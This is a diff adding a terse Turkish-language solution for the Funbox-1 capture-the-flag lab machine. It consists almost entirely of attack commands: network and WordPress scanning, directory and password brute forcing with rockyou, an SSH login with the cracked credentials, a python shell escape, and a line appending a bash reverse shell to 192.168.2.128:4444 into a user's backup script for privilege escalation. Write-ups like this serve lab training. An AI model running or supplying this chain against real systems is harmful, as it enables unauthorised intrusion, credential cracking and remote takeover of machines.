@@ -1,0 +1,12 @@
+FUNBOX-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.94 bulundu.
+2 - nmap -sT -A 192.168.2.94
+3 - nano /etc/hosts, 192.168.2.94  funbox.fritz.box
+4 - http://funbox.fritz.box/robots.txt, http://funbox.fritz.box/secret
+5 - gobuster dir -u http://192.168.2.94 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+6 - wpscan --url http://funbox.fritz.box -e u
+7 - wpscan --url http://funbox.fritz.box --password /usr/share/wordlists/rockyou.txt --usernames joe, joe:12345
+8 - ssh joe@192.168.2.94
+9 - which python, python -c 'import os; os.system("/bin/sh");'
+10 - cd /home/funny, echo "bash -i >& /dev/tcp/192.168.2.128/4444 0>&1" >> .backup.sh
+11 - whoami
